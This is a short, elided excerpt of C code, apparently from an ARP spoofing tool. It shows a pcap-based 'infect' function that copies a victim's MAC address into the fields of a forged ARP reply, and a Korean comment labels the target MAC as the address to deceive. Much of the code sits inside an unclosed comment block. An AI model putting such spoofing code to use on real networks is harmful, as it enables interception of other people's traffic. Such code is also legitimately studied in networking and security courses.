...
void infect(char* argv[],pcap_t *handle,struct allpacket * rcv_packet)
{
    /*
   //IP check
  int i=0;
  ...
  for(int i=0; i<=5;i++)
  {
      s_packet->eth_dmac[i] = rcv_packet->eth_smac[i];
      printf("dmac %x \n",s_packet->eth_dmac[i]);
  }
  //smac --------------------------------------------
  printf("smac :");
    ...
    printf("\n");
      ...
      printf("Target Mac : ");                      // 속일 mac 주소
      //s_packet->arp_target_mac = rcv_packet->eth_smac;
      for(int i=0; i<=5;i++)
      {
           s_packet->arp_target_mac[i] = rcv_packet->eth_smac[i] ;
